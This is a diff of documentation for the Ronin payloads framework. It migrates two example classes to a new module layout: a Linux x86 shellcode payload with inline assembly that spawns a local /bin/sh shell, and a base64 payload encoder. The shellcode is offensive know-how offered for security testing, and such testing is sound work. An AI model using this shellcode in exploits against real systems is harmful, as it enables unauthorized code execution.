@@ -80,34 +80,43 @@ $ ronin-payloads gen example_payload.rb \
 Define a `/bin/sh` shellcode payload:
 
 ```ruby
-require 'ronin/payloads/shellcode'
+require 'ronin/payloads/shellcode_payload'
 
-class BinShShellcode < Ronin::Payloads::Shellcode
+module Ronin
+  module Payloads
+    module Shellcode
+      module Linux
+        module X86
+          class BinSh < Ronin::Payloads::ShellcodePayload
 
-  register 'shellcode-linux-x86-bin-sh'
-  version '0.5'
-  description <<~DESC
-    Shellcode that spawns a local /bin/sh shell
-  DESC
+            register 'shellcode/linux/x86/bin_sh'
+            description <<~DESC
+              Shellcode that spawns a local /bin/sh shell
+            DESC
 
-  targets_arch :x86
-  targets_os   'Linux'
+            arch :x86
+            os :linux
 
-  build do
-    shellcode do
-      xor   eax, eax
-      push  eax
-      push  0x68732f2f
-      push  0x6e69622f
-      mov   esp, ebx
-      push  eax
-      push  ebx
-      mov   esp, ecx
-      xor   edx, edx
-      int   0xb
+            def build
+              shellcode do
+                xor   eax, eax
+                push  eax
+                push  0x68732f2f
+                push  0x6e69622f
+                mov   esp, ebx
+                push  eax
+                push  ebx
+                mov   esp, ecx
+                xor   edx, edx
+                int   0xb
+              end
+            end
+
+          end
+        end
+      end
     end
   end
-
 end
 ```
 
@@ -116,21 +125,29 @@ Define a payload encoder class:
 ```ruby
 require 'ronin/encoders/encoder'
 
-class Base64Encoder < Ronin::Encoders::Encoder
+module Ronin
+  module Payloads
+    module Encoders
+      module Text
+        class Base64 < Ronin::Encoders::Encoder
 
-  register 'text-base64'
+          register 'text/base64'
 
-  description <<~DESC
-    Example base64 payload encoder
-  DESC
+          description <<~DESC
+            Example base64 payload encoder
+          DESC
 
-  targets_arch :x86
-  targets_os   'Linux'
+          arch :x86
+          os   :linux
 
-  def encode(data)
-    data.to_s.base64_encode
+          def encode(data)
+            data.to_s.base64_encode
+          end
+
+        end
+      end
+    end
   end
-
 end
 ```
 
